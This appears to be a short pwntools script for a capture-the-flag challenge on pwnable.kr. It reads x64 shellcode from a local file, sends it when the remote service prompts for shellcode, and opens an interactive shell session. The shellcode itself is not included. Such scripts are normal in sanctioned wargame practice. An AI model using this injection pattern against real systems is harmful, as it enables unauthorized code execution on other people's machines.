from pwn import *
p = remote('pwnable.kr',10015)
# context.log_level='debug'

with open('output.bin', 'rb') as f:
    payload = f.read()

print(len(payload))
p.recvuntil(b'give me your x64 shellcode:')
p.sendline(payload)
p.interactive()